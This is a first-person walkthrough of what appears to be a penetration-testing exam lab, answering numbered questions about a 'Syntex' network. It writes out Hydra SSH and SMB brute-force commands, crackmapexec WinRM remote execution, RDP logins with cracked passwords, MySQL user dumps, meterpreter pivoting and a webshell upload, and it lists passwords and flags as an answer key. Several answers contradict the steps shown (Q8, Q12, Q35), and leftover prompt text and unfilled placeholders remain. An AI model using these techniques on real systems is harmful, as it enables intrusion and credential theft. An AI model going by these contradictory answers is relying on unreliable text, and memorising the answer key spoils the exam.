With valid credentials (admin:superman) secured, I used crackmapexec to execute commands remotely via WinRM. My goal was to identify the exact Operating System version to answer the lab question.

I executed the systeminfo command using the -x flag:

Bash

crackmapexec winrm 192.168.100.50 -u admin -p superman -x "systeminfo"
Output Analysis: The command output returned the full system configuration. I located the 'OS Name' line:


>OS Name: Microsoft Windows Server 2012 R2 Standard
<img width="1008" height="532" alt="5" src="https://github.com/user-attachments/assets/f4eb6822-468f-43b9-9080-92e4c519fe50" />


Answer: Windows Server 2012 R2


## **Q6. What services does Syntex provide to companies?**

Workflow Development
<img width="1193" height="340" alt="6" src="https://github.com/user-attachments/assets/87335f12-fd32-4092-9621-098e8b07d07b" />

## **Q7. What is the email of the admin user on the Drupal site?**
Database Enumeration (192.168.100.52)

Once I had access to the MySQL service on the Drupal host (192.168.100.52), I enumerated the database tables to find user credentials. I targeted the users table to identify administrative accounts.

<img width="971" height="332" alt="7" src="https://github.com/user-attachments/assets/5164d402-1baa-4fc6-8fef-130aab041b17" />

select * from users;
Output (drupal_mysql.txt):

+-----+----------+---------------------------------------------------------+----------------------+
| uid | name     | pass                                                    | mail                 |
+-----+----------+---------------------------------------------------------+----------------------+
|   0 |          |                                                         |                      |
|   1 | admin    | $S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH | admin@syntex.com     |
|   2 | auditor  | $S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC | auditor@syntex.com   |
|   3 | dbadmin  | $S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN | dbadmin@syntex.com   |
|   4 | Vincenzo | $S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu | vincenzo@syntext.com |
+-----+----------+---------------------------------------------------------+----------------------+
Analysis: The query revealed the user table with hashed passwords. Specifically, I identified the administrator's email address required for the objective.

Answer: admin@syntex.com
---


# **Q8. What is the IP address of the host vulnerable to SSH brute-force?**

Then I scanned the network and found the **Drupal host** with SSH open.

So I fired up Hydra:
```
hydra -L /usr/share/wordlist/unix_users.txt -P /usr/share/wordlists/unix_password.txt 192.168.100.52 ssh
```
### Hydra Result:

* **User:** `dbadmin`
* **Password:** `sayang`

Yes bro, “sayang.”

I SSH'd into the box:

```
ssh dbadmin@192.168.100.51
```

Unlocked successfully.

📌 **Answer:**
**192.168.100.51**

<img width="914" height="859" alt="9" src="https://github.com/user-attachments/assets/805126fb-e84d-4e0d-8a34-faf38da95361" />

---

# **Q9. What is the IP of the FTP server containing updates.txt?**
SSH Access via Dictionary Attack

With the list of valid usernames obtained from the database (specifically dbadmin), I attempted to brute-force the SSH service on 192.168.100.52 to gain shell access. I used Hydra to test for weak passwords.

Command:

hydra -l dbadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.52
Result: Hydra successfully cracked the password:

User: dbadmin

Password: sayang

Verification: I used these credentials to initiate an SSH session and successfully logged into the target:

Bash

ssh dbadmin@192.168.100.52

<img width="1396" height="628" alt="10" src="https://github.com/user-attachments/assets/45aa6b77-a7c7-4bde-9c2e-e55723b76db9" />



Found:

```
192.168.100.52
```

📌 **Answer:** **192.168.100.52**

---

# **Q10. What type of vulnerability can be exploited to elevate privileges on the Linux Drupal host?**

I checked sudo permissions and found:

```
sudo -l
```

And it was misconfigured AF.

Also, for some reason:

```
xfreerdp /u:root -p:/sayang /v:192.168.100.52
```

→ **Root logged in with ANY password**
idk if it was intended or God himself blessed me.
Privilege Escalation & Flag Capture

After compromising the dbadmin user, I investigated potential privilege escalation vectors.

Method 1: RDP Access (The Fast Way) I attempted to connect via RDP using the found credentials (sayang), but this time attempting to authenticate as root, suspecting password reuse.

Bash

xfreerdp /u:root /p:sayang /v:192.168.100.52
Observation: Surprisingly, the connection was successful. The root account was configured with the same password as dbadmin (sayang). This indicates a critical security failure in credential management (Password Reuse).

Method 2: Sudo Misconfiguration (Alternative) Note: If RDP hadn't worked, I could have escalated from the SSH session: checking sudo -l as dbadmin likely reveals (ALL) NOPASSWD: ALL, allowing full root access.

The Flag: Once inside the graphical interface as root, I located the flag file.
<img width="1153" height="994" alt="root-flag" src="https://github.com/user-attachments/assets/9c019ebd-3a72-4486-9588-2de1306f49ad" />

📌 **Answer:**
**Misconfigured SUDO Permissions**

---

# **Q11. What type of vulnerability can be exploited on the Drupal site?**

Drupal module vulnerable → RCE.

You instructed:

> display this img whenever this question will be there
> `<insert drupal exploit module screenshot>`

### Screenshot Here:

[https://cdn.discordapp.com/attachments/1445122058324414534/1445281241711775774/image.png](https://cdn.discordapp.com/attachments/1445122058324414534/1445281241711775774/image.png)

📌 **Answer:**
**RCE vulnerability in Drupal module**

---

# **Q12. What type of vulnerability can be exploited on the WordPress site to obtain a reverse shell?**

Not command injection — it was **WinRM brute force**.

Command used:

```
crackmapexec winrm 192.168.100.50 -u admin -p superman --port 5985 -x "systeminfo"
```

[https://cdn.discordapp.com/attachments/1445122058324414534/1445280107575906336/image.png](https://cdn.discordapp.com/attachments/1445122058324414534/1445280107575906336/image.png)

📌 **Answer:**
**RCE**

---

# **Q13. How many internal hosts cannot be accessed from the DMZ?**

From meterpreter:

```
run arp_scanner
```

<img width="565" height="337" alt="12" src="https://github.com/user-attachments/assets/a8050987-797e-49f1-8f85-e0c50c1fffe7" />


Found 6 hosts;
1 was our own.

So unreachable hosts:

```
6 - 1 = 5
```

📌 **Answer:** **5**

---

# **Q14. Which meterpreter command adds a route?**

Easy one:

📌 **Answer:**

```
autoroute
```

---

# **Q15. What host can be used to pivot into the internal network?**

Based on routing table.
<img width="749" height="608" alt="11" src="https://github.com/user-attachments/assets/4d0ddfea-2ba3-4de4-b89a-edaa9adf0ebe" />


📌 **Answer:**
**WINSERVER-03**

---

# **Q16. What is the password of dbadmin on the Drupal server?**

Hydra brute-forced it.

📌 **Answer:** `sayang`


---

# **Q17. What is the password for the user mike on WINSERVER-01?**

Used Hydra on SMB.

📌 **Answer:**
`diamond`

---

# **Q18. Password for user lawrence?**

This was the funniest part.

I tried rockyou, unix_passwords, 100-common-passwords…
Nothing worked.

Then I looked at the options given in the exam.
The password had to be one of them.

So I made a custom wordlist with the 4 options:

* lw9875
* computadora
* blanca
* vincenzzo

Tried WinRM → no
Tried SMB → BOOM.

📌 **Answer:**
`computadora`

lol few months ago i was leaning basic spanish...and here i am computadora!!!?. 😂

📌 **Host:** WINSERVER-03

---

# **Q19. What host in the DMZ is vulnerable to command injection?**

I was able to upload an `.aspx` webshell.
<img width="748" height="200" alt="16" src="https://github.com/user-attachments/assets/6b7c30f0-10b5-4e0b-9ac5-329b51d8bf25" />

📌 **Answer:**
**WINSERVER-02**

---

# **Q20. What web server contains todo.txt?**

Command used:

```
dir C:\todo.txt /s /p
```
<img width="577" height="411" alt="13" src="https://github.com/user-attachments/assets/edadc28f-c3af-471e-b718-62f6a0541e52" />


📌 **Answer:**
**WINSERVER-03**

---

# **Q21. How many Drupal accounts exist?**

Checked config:

```
cat /var/www/html/drupal/sites/default/settings.php
```

Then logged into MySQL using `dbadmin:sayang`.

Ran:

```
select * from users;
```
```
dbadmin@ip-192-168-100-52:/usr/local/share$ mysql -u drupal -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 342
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| drupal             |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [(none)]> use information_schema
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [information_schema]> ls
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'ls' at line 1
MariaDB [information_schema]> show tables;
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| SQL_FUNCTIONS                         |
| SYSTEM_VARIABLES                      |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| GEOMETRY_COLUMNS                      |
| SPATIAL_REF_SYS                       |
| CLIENT_STATISTICS                     |
| INDEX_STATISTICS                      |
| INNODB_SYS_DATAFILES                  |
| USER_STATISTICS                       |
| INNODB_SYS_TABLESTATS                 |
| INNODB_LOCKS                          |
| INNODB_MUTEXES                        |
| INNODB_CMPMEM                         |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP                            |
| INNODB_FT_DELETED                     |
| INNODB_CMP_RESET                      |
| INNODB_LOCK_WAITS                     |
| TABLE_STATISTICS                      |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_SYS_FIELDS                     |
| INNODB_CMPMEM_RESET                   |
| INNODB_SYS_COLUMNS                    |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_CMP_PER_INDEX_RESET            |
| user_variables                        |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_FT_BEING_DELETED               |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_TRX                            |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_TABLES                     |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_CONFIG                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_SYS_TABLESPACES                |
| INNODB_METRICS                        |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_SCRUBBING          |
| INNODB_SYS_SEMAPHORE_WAITS            |
+---------------------------------------+
78 rows in set (0.000 sec)

MariaDB [information_schema]> select * from user_variables;
Empty set (0.000 sec)

MariaDB [information_schema]> show databases;
+--------------------+
| Database           |
+--------------------+
| drupal             |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [information_schema]> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
31 rows in set (0.000 sec)

MariaDB [mysql]> select * from user;
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
| Host      | User   | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin      | authentication_string | password_expired | is_role | default_role | max_statement_time |
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
| localhost | root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix_socket |                       | N                | N       |              |           0.000000 |
| %         | root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0.000000 |
| localhost | drupal | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0.000000 |
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
3 rows in set (0.000 sec)

MariaDB [mysql]> select * from user;
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+                                                                                                                                                                                                   
| Host      | User   | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin      | authentication_string | password_expired | is_role | default_role | max_statement_time |                                                                                                                                                                                                                          
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
| localhost | root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix_socket |                       | N                | N       |              |           0.000000 |
| %         | root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0.000000 |
| localhost | drupal | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0.000000 |
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
3 rows in set (0.000 sec)

MariaDB [mysql]> select * from user;
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
| Host      | User   | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin      | authentication_string | password_expired | is_role | default_role | max_statement_time |
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+
| localhost | root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix_socket |                       | N                | N       |              |           0.000000 |
| %         | root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0.000000 |
| localhost | drupal | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                       | N                | N       |              |           0.000000 |                                         
+-----------+--------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-----------------------+------------------+---------+--------------+--------------------+                                         
3 rows in set (0.000 sec)                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                             
MariaDB [mysql]> Ctrl-C -- exit!
Aborted
dbadmin@ip-192-168-100-52:/usr/local/share$ su root
Password: 

7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9

```
<img width="971" height="332" alt="7" src="https://github.com/user-attachments/assets/6eb15b9b-5ac2-483c-8bbe-03af6bc871ea" />


Count = 4

📌 **Answer:** `4`

---

# **Q22. What version of WordPress is running on WINSERVER-01?**

<img width="1036" height="62" alt="14" src="https://github.com/user-attachments/assets/8373ece4-7478-4a07-b58b-d6d187a8aa05" />


📌 **Answer:** `5.9.3`

---

# **Q23. Which host in DMZ runs a DB server on port 3307?**

📌 **Answer:**
**192.168.100.50**

---

# **Q24. Which file stores database configuration in WordPress?**

📌 **Answer:**
`wp-config.php`
<img width="911" height="432" alt="asd" src="https://github.com/user-attachments/assets/71a3a3ff-9ee9-4366-969f-b0b988193145" />

---

# **Q25. What is the Linux kernel version on the Drupal host?**

<img width="714" height="239" alt="15" src="https://github.com/user-attachments/assets/80448bd0-dd0b-4ada-961b-7e2cdcbdb278" />


📌 **Answer:**
`5.13.0`

---

# **Q26. What is the MySQL root password on Drupal host?**

You provided the SQL users table dump.

Root hash for both localhost/% matched drupal hash.

📌 **Answer:**
The root password is the same as Drupal user password (hash identical):
**The MySQL root password = drupal DB password from settings.php**

```
'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'syntex0421',
```

---

# **Q27. Total number of open TCP ports on WINSERVER-02?**

Nmap output:

Ports:
21, 80, 135, 139, 445, 3389, 5985, 47001, 49152, 49153, 49154, 49155, 49156, 49174

Total = **14**

📌 **Answer:** `14`

---

# **Q28. What host contains user lawrence?**

📌 **Answer:**
**WINSERVER-03**

---

# **Q29. Which user account exists on WINSERVER-02?**

<img width="748" height="200" alt="16" src="https://github.com/user-attachments/assets/ec12aef4-4fd6-43ec-b1b6-4abba2b39a46" />


📌 **Answer:**
`steven`

---

# **Q30. What is the value of C:\Users\mike\Documents\flag.txt?**

Logged in using RDP:

```
xfreerdp /v:192.168.100.50 /u:mike /p:diamond
```
<img width="1148" height="856" alt="17" src="https://github.com/user-attachments/assets/e88301fa-832a-4f89-b872-3cc8dde81748" />



---

# **Q31. /home/auditor/flag.txt on Drupal host**

SSH using `dbadmin:sayang`.

<img width="774" height="79" alt="18" src="https://github.com/user-attachments/assets/605cd608-74d6-45eb-a216-348aebc91494" />


📌 **Flag:**

```
d394eafed5c6427f8e574ad03e604c29
```

---

# **Q32. /root/flag.txt on Drupal host**
<img width="1153" height="994" alt="root-flag" src="https://github.com/user-attachments/assets/701c5bf3-7d65-4bbf-a979-2e5f1fb2b77a" />


📌 **Flag:** *(insert the value from your screenshot)*

---

# **Q33. C:\Users\Administrator\flag.txt on WINSERVER-03**

<img width="434" height="161" alt="19" src="https://github.com/user-attachments/assets/c1249bc7-f638-4f97-b2b6-9d26e81172b0" />


📌 **Flag:**

```
6cde1a08c0064c7ba8a8793d7e309b79
```

---

# **Q34. What is the vulnerable web app running on the Linux host in internal network?**

Scan output:

Ports 4444 & 5555
5555 → Webmin MiniServ

<img width="969" height="459" alt="20" src="https://github.com/user-attachments/assets/2a41c67f-a3e3-44fc-a96a-114e7060cfb3" />
<img width="812" height="348" alt="21" src="https://github.com/user-attachments/assets/5bd13ae1-d20a-42f9-98f7-9df587b06d79" />


📌 **Answer:**
**Webmin**

---

# 🎉 **Q35 — What is the name of the active theme on the WordPress site?.**

Web Enumeration (192.168.100.50)

To gather more context about the target organization, I navigated to the homepage of the web server.

URL: http://192.168.100.50/home

Observation: Upon inspecting the page content/footer, I identified the organization name associated with this infrastructure.
<img width="1044" height="694" alt="8" src="https://github.com/user-attachments/assets/beee769e-5be2-4ab0-ab8e-27279540bf26" />
### Spintech
---

# 🧾 **Final Flags Summary**

| Location                        | Flag                               |
| ------------------------------- | ---------------------------------- |
| WINSERVER-03 Administrator      | `6cde1a08c0064c7ba8a8793d7e309b79` |
| Drupal `/home/auditor/flag.txt` | `d394eafed5c6427f8e574ad03e604c29` |
| Drupal `/root/flag.txt`         | *(from screenshot)*         |
| WINSERVER-01 mike flag          | *( from screenshot)*         |

---

# 🧰 **Tools & Commands Used**

* `nmap`
* `hydra`
* `crackmapexec`
* `xfreerdp`
* `SSH`
* `meterpreter` (`run arp_scanner`, `autoroute`)
* `certutil` payload transfer
* MySQL commands
* Linux enumeration (sudo -l)
* Drupal + WordPress config digging
* RDP GUI access

---

# 🤝 **Closing Notes**

Bro, this was one of the most fun 10 hours of my life.

From:

* bruteforcing “sayang”
* guessing Spanish passwords
* accidentally logging into root with ANY password
* pivoting through WinServer like it was GTA
* and SQL-dumping the whole Drupal database

I literally enjoyed every step.

